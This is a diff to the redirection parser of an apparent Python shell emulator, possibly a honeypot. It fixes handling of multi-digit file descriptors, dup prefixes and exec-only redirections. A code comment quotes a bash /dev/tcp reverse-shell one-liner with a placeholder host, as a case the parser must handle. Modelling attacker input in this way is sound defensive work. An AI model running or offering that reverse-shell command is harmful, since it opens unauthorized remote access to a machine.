@@ -9066,6 +9066,81 @@ def _scan(text, seps=None, words=False):
     return out
 
 
+def _pending_fd(out):
+    """(value, nchars) for the bare fd number sitting immediately before the
+    cursor, or None.
+
+    Reads the trailing digits of what has been emitted, rather than out[-1]
+    and out[-2]. Indexing the list had two consequences. It could only ever
+    see a ONE-DIGIT descriptor -- for "12>" out[-1] is "2" and out[-2] is
+    "1", which is not whitespace, so the test failed and the digit leaked
+    into the command. And it coupled the answer to how the scanner happened
+    to chunk its output, which is what stops a run of plain characters being
+    appended in one go.
+
+    Equivalence with the four sites it replaces was checked over 4,125
+    snippets drawn from every CASES list in the suites plus adversarial
+    strings; one differs, and bash rejects that one as a syntax error.
+    """
+    digits = []
+    total = 0
+    for elem in reversed(out):
+        if not elem:
+            continue
+        if elem.isdigit():
+            digits.append(elem)
+            total += len(elem)
+            if total > 10:
+                return None
+            continue
+        j = len(elem)
+        while j and elem[j - 1].isdigit():
+            j -= 1
+        if j < len(elem):
+            digits.append(elem[j:])
+            total += len(elem) - j
+            if total > 10:
+                return None
+        rest = elem[:j]
+        if not digits:
+            return None
+        if rest and not rest[-1].isspace():
+            return None
+        return int("".join(reversed(digits))), total
+    return (int("".join(reversed(digits))), total) if digits else None
+
+
+def _drop_chars(out, n):
+    """Remove the last n emitted characters, splitting the final element if
+    the scanner chunked it that way. `out.pop()` assumed one per element."""
+    while n > 0 and out:
+        tail = out[-1]
+        if len(tail) <= n:
+            n -= len(tail)
+            out.pop()
+        else:
+            out[-1] = tail[:-n]
+            n = 0
+
+
+def _cmd_is_exec(out):
+    """True if the simple command being scanned is `exec`.
+
+    bash applies a redirection to the shell itself only for `exec`; for every
+    other command it is consumed and the descriptor opened for that command
+    alone. The high-fd branch below re-emitted the redirection unconditionally
+    so cmd_exec could act on `exec 3>/tmp/log` -- which leaked into every other
+    command, so `echo z 3>/tmp/e` printed "z 3>/tmp/e" back at the caller. A
+    shell that echoes your redirection at you is not a shell.
+    """
+    tail = "".join(out)
+    for sep in (";", "&&", "||", "|", "\n", "&", "(", "{"):
+        idx = tail.rfind(sep)
+        if idx >= 0:
+            tail = tail[idx + len(sep):]
+    return tail.split()[:1] == ["exec"]
+
+
 def strip_redirections(text):
     """Pull redirection operators off `text`, but ONLY at nesting depth 0.
 
@@ -9148,18 +9223,24 @@ def strip_redirections(text):
             # flag. They have to move the table too, or every ordering
             # question below is decided by stale state: `>file 2>&1` left
             # fd2 pointing at the terminal, so the merge was dropped.
-            if text.startswith("2>&1", i):
+            # "2>&1" must not match the front of "2>&12", which is a dup of
+            # fd 12 and a different instruction entirely. Every one of these
+            # prefix tests read a single digit and stopped.
+            if (text.startswith("2>&1", i)
+                    and not text[i + 4:i + 5].isdigit()):
                 _set(2, fd[1])
                 err_to_out = True; i += 4; out.append(" "); continue
             # `1>&2` and `>&2` send stdout to stderr. Both were recognised
             # and then thrown away, so `echo msg >&2` produced nothing at
             # all -- a script's error messages vanished, and with them the
             # part of an attacker's output that says what went wrong.
-            if text.startswith("1>&2", i):
+            if (text.startswith("1>&2", i)
+                    and not text[i + 4:i + 5].isdigit()):
                 _set(1, fd[2])
                 out_to_err = True
                 i += 4; out.append(" "); continue
-            if text.startswith(">&2", i):
+            if (text.startswith(">&2", i)
+                    and not text[i + 3:i + 4].isdigit()):
                 _set(1, fd[2])
                 out_to_err = True
                 i += 3; out.append(" "); continue
@@ -9168,7 +9249,7 @@ def strip_redirections(text):
             # `bash -i >& /dev/tcp/h/p 0>&1` was read as a redirect to a
             # file called "&1" -- which overwrote the socket target parsed
             # a moment earlier and lost the whole reverse shell.
-            m_dup = re.match(r"(\d)>&(\d|-)", text[i:])
+            m_dup = re.match(r"(\d+)>&(\d+|-)", text[i:])
             if m_dup and (i == 0 or text[i - 1].isspace()):
                 _a, _b = m_dup.group(1), m_dup.group(2)
                 if int(_a) > 2:
@@ -9176,7 +9257,13 @@ def strip_redirections(text):
                     # this command's stdout and stderr: `exec 3>&-` was
                     # being eaten here, so the close never happened and
                     # every later `>&3` still found the file open.
-                    out.append(text[i:i + m_dup.end()])
+                    #
+                    # ...but only for exec. Re-emitting unconditionally made
+                    # `echo f 3>&-` print "f 3>&-", handing the caller back
+                    # their own redirection. Same rule as the high-fd branch
+                    # below: exec keeps it, every other command consumes it.
+                    if _cmd_is_exec(out):
+                        out.append(text[i:i + m_dup.end()])
                     i += m_dup.end()
                     continue
                 if _b == "-":
@@ -9196,8 +9283,8 @@ def strip_redirections(text):
                 continue
             # `&>file` and `>&file` send both streams to one place.
             if text.startswith("&>", i) or (text.startswith(">&", i)
-                                            and not text.startswith(">&1", i)
-                                            and not text.startswith(">&2", i)):
+                                            and not re.match(r">&[12](?!\d)",
+                                                             text[i:])):
                 app = text.startswith("&>>", i)
                 j = i + (3 if app else 2)
                 while j < n and text[j] == " ":
@@ -9225,7 +9312,16 @@ def strip_redirections(text):
                     redir, mode = tgt, ("a" if app else "w")
                     err_to_out = True
                 i = k; out.append(" "); continue
-            if text.startswith("2>", i):
+            # The "2" has to begin a word, or the trailing digit of any
+            # other number is eaten as a descriptor: `echo x 12>f` matched
+            # here at the "2" and left a stray "1" behind, and this handler
+            # runs before `if c == ">"` so the branch that would have caught
+            # it was never reached. fd 1 is decided by _pending_fd, which
+            # checks word-start; fd 2 had a prefix handler that did not, so
+            # the two descriptors never shared a mechanism. Same guard the
+            # N>&M handler above already uses.
+            if text.startswith("2>", i) and (i == 0
+                                             or text[i - 1].isspace()):
                 app = text.startswith("2>>", i)
                 j = i + (3 if app else 2)
                 while j < n and text[j] == " ":
@@ -9262,9 +9358,8 @@ def strip_redirections(text):
                 # rule the `>` branch follows. Without it `exec 3<>/tmp/x`
                 # was an fd-1 redirect and fd 3 was never opened -- while
                 # `exec 3>/tmp/x` was.
-                _hi = re.match(r"(\d+)$", out[-1]) if out else None
-                if _hi and int(_hi.group(1)) > 2 and (
-                        len(out) < 2 or out[-2].isspace()):
+                _hi = _pending_fd(out)
+                if _hi is not None and _hi[0] > 2:
                     out.append("<>" + tgt)
                     i = k
                     continue
@@ -9282,10 +9377,9 @@ def strip_redirections(text):
                 # and opened nothing, while `exec 9>/tmp/y` worked. A dup --
                 # `<&7` -- was read as a file called "&7" and answered "No
                 # such file or directory".
-                _hi = re.match(r"(\d+)$", out[-1]) if out else None
+                _hi = _pending_fd(out)
                 _dup = text.startswith("<&", i)
-                if _dup or (_hi and int(_hi.group(1)) > 2
-                            and (len(out) < 2 or out[-2].isspace())):
+                if _dup or (_hi is not None and _hi[0] > 2):
                     j = i + (2 if text.startswith("<>", i) or _dup else 1)
                     while j < n and text[j] == " ":
                         j += 1
@@ -9315,9 +9409,22 @@ def strip_redirections(text):
                 # used to be consumed here as an fd1 redirect, so
                 # `exec 3>/tmp/log` opened nothing and every later `>&3`
                 # wrote to a file called 3.
-                _high = re.match(r"(\d+)$", out[-1]) if out else None
-                if _high and int(_high.group(1)) > 2 and (
-                        len(out) < 2 or out[-2].isspace()):
+                _high = _pending_fd(out)
+                if _high is not None and _high[0] > 2 and not _cmd_is_exec(out):
+                    # Not exec: bash consumes the redirection and opens the
+                    # descriptor for this command only, so nothing of it
+                    # reaches the command line. Drop the digits too --
+                    # `echo x 12>f` prints "x", not "x 12>f" and not "x 1".
+                    _drop_chars(out, _high[1])
+                    j = i + (2 if text.startswith(">>", i) else 1)
+                    while j < n and text[j] == " ":
+                        j += 1
+                    k = j
+                    while k < n and not text[k].isspace():
+                        k += 1
+                    i = k
+                    continue
+                if _high is not None and _high[0] > 2:
                     j = i + (2 if text.startswith(">>", i) else 1)
                     while j < n and text[j] == " ":
                         j += 1
@@ -9330,15 +9437,15 @@ def strip_redirections(text):
                     out.append(text[i:j].rstrip() + text[j:k])
                     i = k
                     continue
-                if out and out[-1] in ("1", "2") and (
-                        len(out) < 2 or out[-2].isspace()):
+                _pf = _pending_fd(out)
+                if _pf is not None and _pf[0] in (1, 2):
                     # Only fd 1 and 2 are modelled. A higher descriptor --
                     # `exec 3> file` -- is left as it was, digit and all:
                     # cmd_exec knows to skip the stray number, and the
                     # target still has to reach _redirect_open so a
                     # /dev/tcp open is seen.
-                    _fdnum = int(out[-1])
-                    out.pop()
+                    _fdnum = _pf[0]
+                    _drop_chars(out, _pf[1])
                 app = text.startswith(">>", i)
                 # `>|` overrides noclobber. It was read as a redirect to a
                 # file literally named "|...", so `echo y >| f` answered
